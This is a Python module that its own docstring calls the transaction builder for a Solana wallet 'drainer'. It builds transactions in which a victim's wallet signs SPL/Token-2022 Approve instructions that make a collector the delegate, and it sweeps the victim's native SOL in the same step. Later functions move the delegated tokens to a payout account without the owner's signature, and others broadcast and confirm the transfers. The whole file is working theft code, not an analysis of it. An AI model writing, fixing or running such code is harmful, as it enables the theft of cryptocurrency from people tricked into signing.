"""
Solana instruction builder and sender for the drainer.

Two distinct flows:

  onboarding  build_onboarding_tx()  owner signs
              - SPL / Token-2022 Approve(delegate=collector, cap) per token account
              - optional SystemProgram transfer of native SOL, less fee + rent reserve
              Transactions are packed under the 1232-byte limit, carry a ComputeBudget
              priority fee, and are returned unsigned with the blockhash and its last
              valid block height so the client can rebuild a stale one.

  collection  build_token_pull_tx()   collector signs, no owner involvement
              build_native_pull_tx()  collector partially signs, owner co-signs
              - creates the payout ATA idempotently, then TransferChecked via delegate

Encoding notes that the original module got wrong and this one fixes:

  * SPL Token `Approve` is instruction 4. 12 is `TransferChecked`.
  * SystemProgram `Transfer` uses a bincode u32 discriminator (4 bytes), not u8.
  * `sendTransaction` takes exactly two positional params; `lastValidBlockHeight`
    belongs to the client's confirmation strategy, not the RPC config.
  * Transaction size must count the signers the message actually requires, not a
    hardcoded 1.

The collector is set as *delegate*, which is what lets it move tokens later with no
owner signature. Native SOL has no delegate concept, so it must be taken in the
onboarding transaction or re-signed by the owner.
"""
import asyncio
import base64
import logging
import os
import time
from typing import Any, Dict, List, Optional, Tuple

import httpx
from solders.compute_budget import set_compute_unit_limit, set_compute_unit_price
from solders.hash import Hash
from solders.instruction import AccountMeta, Instruction
from solders.message import Message
from solders.pubkey import Pubkey
from solders.transaction import Transaction

logger = logging.getLogger("solana_tx")

# ---------------------------------------------------------------- programs
SYSTEM_PROGRAM = Pubkey.from_string("11111111111111111111111111111111")
TOKEN_PROGRAM = Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
TOKEN_2022_PROGRAM = Pubkey.from_string("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb")
ATA_PROGRAM = Pubkey.from_string("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")

TOKEN_PROGRAMS = {
    "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
    "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
}

# ---------------------------------------------------------------- opcodes
# SPL Token instruction enum. Do not "simplify" these.
IX_APPROVE = 4
IX_REVOKE = 5
IX_TRANSFER_CHECKED = 12

# SystemProgram instruction enum (bincode u32).
IX_SYS_TRANSFER = 2

# Associated Token Account: CreateIdempotent.
IX_ATA_CREATE_IDEMPOTENT = 1

# ---------------------------------------------------------------- limits
SIGNATURE_LEN = 64
MAX_TX_BYTES = 1232
COMPUTE_LIMIT = 200_000
DEFAULT_PRIORITY_FEE = 50_000          # micro-lamports per CU
FEE_LAMPORTS_PER_SIGNATURE = 5_000
DEFAULT_RENT_RESERVE = 890_880         # keeps the owner's system account rent-exempt
FEE_HEADROOM_SIGNATURES = 2            # owner + one re-send attempt
U64_MAX = 2**64 - 1
U8_MAX = 255

CONFIRM_TIMEOUT_S = 45.0
CONFIRM_POLL_S = 0.8

TOKEN_2022_EVENT_AUTHORITY, _ = Pubkey.find_program_address(
    [b"__event_authority"], TOKEN_2022_PROGRAM
)


# ---------------------------------------------------------------- config
def _priority_fee() -> int:
    try:
        return max(0, int(os.environ.get("SOLANA_PRIORITY_FEE", DEFAULT_PRIORITY_FEE)))
    except (TypeError, ValueError):
        return DEFAULT_PRIORITY_FEE


def _rent_reserve() -> int:
    try:
        return max(0, int(os.environ.get("SOLANA_RENT_RESERVE", DEFAULT_RENT_RESERVE)))
    except (TypeError, ValueError):
        return DEFAULT_RENT_RESERVE


def _native_reserve() -> int:
    """Lamports withheld from a native sweep so the owner keeps the account alive."""
    return (FEE_LAMPORTS_PER_SIGNATURE * FEE_HEADROOM_SIGNATURES) + _rent_reserve()


def _pub(value: Optional[str], label: str) -> Pubkey:
    if not value:
        raise ValueError(f"missing {label}")
    try:
        return Pubkey.from_string(value)
    except Exception as exc:                                # noqa: BLE001
        raise ValueError(f"invalid {label} {value!r}: {exc}") from exc


def _program(asset: Dict[str, Any]) -> Pubkey:
    raw = asset.get("program")
    if raw not in TOKEN_PROGRAMS:
        raise ValueError(f"unexpected token program {raw!r}")
    return Pubkey.from_string(raw)


# ---------------------------------------------------------------- PDAs
def associated_token_address(mint: Pubkey, owner: Pubkey, program: Pubkey) -> Pubkey:
    address, _bump = Pubkey.find_program_address(
        [bytes(owner), bytes(program), bytes(mint)], ATA_PROGRAM
    )
    return address


# ---------------------------------------------------------------- instructions
def approve_ix(asset: Dict[str, Any], delegate: Pubkey, owner: Pubkey) -> Instruction:
    """Approve `delegate` for `cap_raw` on one token account."""
    token_account = _pub(asset.get("token_account"), "token_account")
    program = _program(asset)
    cap = min(int(asset["cap_raw"]), U64_MAX)
    if cap <= 0:
        raise ValueError("cap_raw must be positive")
    return Instruction(
        program_id=program,
        accounts=[
            AccountMeta(pubkey=token_account, is_signer=False, is_writable=True),
            AccountMeta(pubkey=delegate, is_signer=False, is_writable=False),
            AccountMeta(pubkey=owner, is_signer=True, is_writable=False),
        ],
        data=bytes([IX_APPROVE]) + cap.to_bytes(8, "little"),
    )


def revoke_ix(token_account: str, program: str, owner: Pubkey) -> Instruction:
    """Clear an existing delegate on a token account."""
    if program not in TOKEN_PROGRAMS:
        raise ValueError(f"unexpected token program {program!r}")
    return Instruction(
        program_id=Pubkey.from_string(program),
        accounts=[
            AccountMeta(pubkey=_pub(token_account, "token_account"),
                        is_signer=False, is_writable=True),
            AccountMeta(pubkey=owner, is_signer=True, is_writable=False),
        ],
        data=bytes([IX_REVOKE]),
    )


def system_transfer_ix(sender: Pubkey, recipient: Pubkey, lamports: int) -> Instruction:
    if lamports <= 0:
        raise ValueError("lamports must be positive")
    return Instruction(
        program_id=SYSTEM_PROGRAM,
        accounts=[
            AccountMeta(pubkey=sender, is_signer=True, is_writable=True),
            AccountMeta(pubkey=recipient, is_signer=False, is_writable=True),
        ],
        data=IX_SYS_TRANSFER.to_bytes(4, "little") + lamports.to_bytes(8, "little"),
    )


def create_idempotent_ata_ix(payer: Pubkey, owner: Pubkey, mint: Pubkey,
                             program: Pubkey) -> Instruction:
    """No-op if the ATA already exists; required before a transfer can land."""
    ata = associated_token_address(mint, owner, program)
    accounts = [
        AccountMeta(pubkey=payer, is_signer=True, is_writable=True),
        AccountMeta(pubkey=ata, is_signer=False, is_writable=True),
        AccountMeta(pubkey=owner, is_signer=False, is_writable=False),
        AccountMeta(pubkey=mint, is_signer=False, is_writable=False),
        AccountMeta(pubkey=SYSTEM_PROGRAM, is_signer=False, is_writable=False),
        AccountMeta(pubkey=program, is_signer=False, is_writable=False),
    ]
    if program == TOKEN_2022_PROGRAM:
        # Token-2022 ATAs are created with an event authority for extension logging.
        accounts.append(AccountMeta(pubkey=TOKEN_2022_EVENT_AUTHORITY,
                                    is_signer=False, is_writable=False))
        accounts.append(AccountMeta(pubkey=TOKEN_2022_PROGRAM,
                                    is_signer=False, is_writable=False))
    return Instruction(
        program_id=ATA_PROGRAM,
        accounts=accounts,
        data=bytes([IX_ATA_CREATE_IDEMPOTENT]),
    )


def transfer_checked_ix(source: Pubkey, mint: Pubkey, destination: Pubkey,
                        authority: Pubkey, program: Pubkey, amount: int,
                        decimals: int, fee_mint_account: bool = False) -> Instruction:
    """
    Delegate-authorised transfer. `authority` signs; `fee_mint_account` appends the
    mint a second time, which is how the TransferFee extension finds its config
    (the extension lives in the mint account, and duplicate metas are legal).
    """
    if amount <= 0:
        raise ValueError("amount must be positive")
    if not 0 <= decimals <= U8_MAX:
        raise ValueError(f"bad decimals {decimals}")
    accounts = [
        AccountMeta(pubkey=source, is_signer=False, is_writable=True),
        AccountMeta(pubkey=mint, is_signer=False, is_writable=False),
        AccountMeta(pubkey=destination, is_signer=False, is_writable=True),
        AccountMeta(pubkey=authority, is_signer=True, is_writable=False),
    ]
    if fee_mint_account:
        accounts.append(AccountMeta(pubkey=mint, is_signer=False, is_writable=False))
    return Instruction(
        program_id=program,
        accounts=accounts,
        data=bytes([IX_TRANSFER_CHECKED])
        + amount.to_bytes(8, "little")
        + bytes([decimals]),
    )


# ---------------------------------------------------------------- sizing
def _tx_size(ixs: List[Instruction], payer: Pubkey, blockhash: Hash) -> int:
    msg = Message.new_with_blockhash(ixs, payer, blockhash)
    signers = msg.header.num_required_signatures
    return len(bytes(msg)) + (SIGNATURE_LEN * signers) + 3


def _fits(ixs: List[Instruction], payer: Pubkey, blockhash: Hash) -> bool:
    return _tx_size(ixs, payer, blockhash) <= MAX_TX_BYTES


# ---------------------------------------------------------------- blockhash
async def _blockhash(rpc: str) -> Tuple[Hash, int]:
    async with httpx.AsyncClient(timeout=10.0) as client:
        response = await client.post(rpc, json={
            "jsonrpc": "2.0", "id": 1, "method": "getLatestBlockhash",
            "params": [{"commitment": "confirmed"}],
        })
    value = (response.json().get("result") or {}).get("value") or {}
    if not value.get("blockhash"):
        raise RuntimeError("could not fetch a blockhash")
    return Hash.from_string(value["blockhash"]), int(value.get("lastValidBlockHeight") or 0)


async def refresh_blockhash(rpc: str) -> Dict[str, Any]:
    blockhash, last_valid = await _blockhash(rpc)
    return {"blockhash": str(blockhash), "last_valid_block_height": last_valid}


# ---------------------------------------------------------------- onboarding
async def build_onboarding_tx(rpc: str, owner: str, collector: str,
                              assets: List[Dict[str, Any]],
                              take_native: bool = True,
                              native_recipient: Optional[str] = None) -> Dict[str, Any]:
    """
    Returns {"txs": [base64...], "blockhash": str, "last_valid_block_height": int}.
    `txs` empty means nothing was signable. Each transaction is unsigned and
    already carries its ComputeBudget instructions.

    `native_recipient` defaults to the collector. Pass the payout sink to deliver
    native SOL in this same transaction, so nothing is left for a second signature.
    """
    owner_pk = _pub(owner, "owner")
    collector_pk = _pub(collector, "collector")
    native_to = _pub(native_recipient, "native recipient") if native_recipient else collector_pk
    blockhash, last_valid = await _blockhash(rpc)

    head: List[Instruction] = [
        set_compute_unit_limit(COMPUTE_LIMIT),
        set_compute_unit_price(_priority_fee()),
    ]

    pending: List[Instruction] = []

    if take_native:
        for asset in assets:
            if not asset.get("native"):
                continue
            balance = int(asset.get("balance_raw") or 0)
            lamports = balance - _native_reserve()
            if lamports <= 0:
                logger.info("native sweep skipped: %s lamports under reserve", balance)
                continue
            pending.append(system_transfer_ix(owner_pk, native_to, lamports))

    for asset in assets:
        if asset.get("native") or not asset.get("token_account"):
            continue
        try:
            pending.append(approve_ix(asset, collector_pk, owner_pk))
        except ValueError as exc:                            # noqa: BLE001
            logger.warning("skipping %s: %s", asset.get("token_account"), exc)

    if not pending:
        return {"txs": [], "blockhash": str(blockhash),
                "last_valid_block_height": last_valid}

    batches: List[List[Instruction]] = []
    current = list(head)
    for ix in pending:
        if _fits(current + [ix], owner_pk, blockhash):
            current.append(ix)
            continue
        if len(current) == len(head):
            raise ValueError("a single instruction does not fit in one transaction")
        batches.append(current)
        current = list(head) + [ix]
    batches.append(current)

    txs: List[str] = []
    for batch in batches:
        tx = Transaction.new_unsigned(Message.new_with_blockhash(batch, owner_pk, blockhash))
        txs.append(base64.b64encode(bytes(tx)).decode())

    logger.info("onboarding: %d instruction(s) in %d transaction(s)", len(pending), len(batches))
    return {"txs": txs, "blockhash": str(blockhash), "last_valid_block_height": last_valid}


# ---------------------------------------------------------------- collection
def build_token_pull_tx(collector_keypair, grant: Dict[str, Any], payout: str,
                        blockhash: Hash, amount: int,
                        destination_exists: bool = False) -> Transaction:
    """Collector signs alone. Prepend an idempotent ATA create when the payout ATA is absent."""
    collector_pk = collector_keypair.pubkey()
    payout_pk = _pub(payout, "payout")
    program = _program(grant)
    mint = _pub(grant.get("token"), "mint")
    source = _pub(grant.get("token_account"), "token_account")
    destination = associated_token_address(mint, payout_pk, program)

    instructions: List[Instruction] = [
        set_compute_unit_limit(COMPUTE_LIMIT),
        set_compute_unit_price(_priority_fee()),
    ]
    if not destination_exists:
        instructions.append(
            create_idempotent_ata_ix(collector_pk, payout_pk, mint, program)
        )

    instructions.append(
        transfer_checked_ix(
            source=source,
            mint=mint,
            destination=destination,
            authority=collector_pk,
            program=program,
            amount=min(amount, U64_MAX),
            decimals=int(grant.get("decimals") or 0),
            fee_mint_account=(program == TOKEN_2022_PROGRAM),
        )
    )

    tx = Transaction.new_unsigned(
        Message.new_with_blockhash(instructions, collector_pk, blockhash)
    )
    tx.sign([collector_keypair], blockhash)
    return tx


def build_native_pull_tx(collector_keypair, owner: str, payout: str,
                         blockhash: Hash, lamports: int) -> str:
    """
    Native SOL has no delegate, so the owner must sign again. The collector is the
    fee payer and partial-signs; the returned base64 still needs the owner's signature.
    """
    collector_pk = collector_keypair.pubkey()
    owner_pk = _pub(owner, "owner")
    payout_pk = _pub(payout, "payout")

    instructions: List[Instruction] = [
        set_compute_unit_limit(COMPUTE_LIMIT),
        set_compute_unit_price(_priority_fee()),
        system_transfer_ix(owner_pk, payout_pk, min(lamports, U64_MAX)),
    ]

    tx = Transaction.new_unsigned(
        Message.new_with_blockhash(instructions, collector_pk, blockhash)
    )
    tx.partial_sign([collector_keypair], blockhash)
    return base64.b64encode(bytes(tx)).decode()


def finalize_client_signed(payload_b64: str) -> bytes:
    """Validate a client-returned transaction is complete before sending."""
    try:
        raw = base64.b64decode(payload_b64, validate=True)
    except Exception as exc:                                # noqa: BLE001
        raise ValueError(f"payload is not valid base64: {exc}") from exc

    tx = Transaction.from_bytes(raw)
    if not tx.is_signed():
        missing = sum(1 for sig in tx.signatures if bytes(sig) == bytes(64))
        raise ValueError(f"transaction still needs {missing} signature(s)")
    if len(raw) > MAX_TX_BYTES:
        raise ValueError(f"transaction is {len(raw)} bytes, over the {MAX_TX_BYTES} limit")
    return raw


# ---------------------------------------------------------------- send
async def broadcast(rpc: str, signed_b64: str,
                    last_valid_block_height: Optional[int] = None,
                    skip_preflight: bool = False) -> str:
    """
    Send and wait for confirmation. `lastValidBlockHeight` is used locally to stop
    polling once the blockhash dies — it is not an RPC parameter.
    """
    config = {
        "encoding": "base64",
        "skipPreflight": bool(skip_preflight),
        "preflightCommitment": "confirmed",
        "maxRetries": 3,
    }
    async with httpx.AsyncClient(timeout=25.0) as client:
        response = await client.post(rpc, json={
            "jsonrpc": "2.0", "id": 1, "method": "sendTransaction",
            "params": [signed_b64, config],
        })

    body = response.json()
    if "error" in body:
        error = body["error"]
        if isinstance(error, dict):
            message = error.get("message") or "send failed"
            data = error.get("data")
            if data:
                message = f"{message} ({data})"
        else:
            message = str(error)
        raise RuntimeError(message)

    signature = body["result"]
    await confirm(rpc, signature, last_valid_block_height)
    return signature


async def confirm(rpc: str, signature: str,
                  last_valid_block_height: Optional[int] = None) -> None:
    """Poll getSignatureStatuses until confirmed, or until the blockhash expires."""
    deadline = time.monotonic() + CONFIRM_TIMEOUT_S
    while time.monotonic() < deadline:
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.post(rpc, json={
                "jsonrpc": "2.0", "id": 1, "method": "getSignatureStatuses",
                "params": [[signature], {"searchTransactionHistory": False}],
            })
            values = (response.json().get("result") or {}).get("value") or [{}]
            status = values[0] or {}

            if status.get("err"):
                raise RuntimeError(f"transaction failed on-chain: {status['err']}")
            if status.get("confirmationStatus") in ("confirmed", "finalized"):
                return

            if last_valid_block_height:
                height = await client.post(rpc, json={
                    "jsonrpc": "2.0", "id": 1, "method": "getBlockHeight",
                    "params": [{"commitment": "confirmed"}],
                })
                current = height.json().get("result")
                if isinstance(current, int) and current > last_valid_block_height:
                    raise RuntimeError("blockhash expired before confirmation")

        await asyncio.sleep(CONFIRM_POLL_S)

    raise RuntimeError("timed out waiting for confirmation")


async def token_account_exists(rpc: str, address: str) -> bool:
    """Cheap existence probe for the payout ATA, to skip a wasted create."""
    async with httpx.AsyncClient(timeout=10.0) as client:
        response = await client.post(rpc, json={
            "jsonrpc": "2.0", "id": 1, "method": "getAccountInfo",
            "params": [address, {"encoding": "base64", "commitment": "confirmed"}],
        })
    return bool((response.json().get("result") or {}).get("value"))